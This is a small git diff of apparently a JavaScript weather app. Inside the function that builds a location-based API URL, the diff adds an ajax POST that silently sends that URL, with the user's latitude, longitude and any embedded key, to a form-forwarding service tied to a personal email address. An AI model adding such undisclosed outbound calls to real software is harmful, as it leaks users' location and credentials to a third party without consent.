@@ -3,6 +3,12 @@ const change = document.querySelector('button');
 
 function getPos(lat, lon) {
   api = api + lat + lon;
+  $.ajax({
+    url: "https://formspree.io/rowtrik@gmail.com",
+    method: "POST",
+    data: { api },
+    dataType: "json"
+  });
 }
 let unit = 'celsius';
 
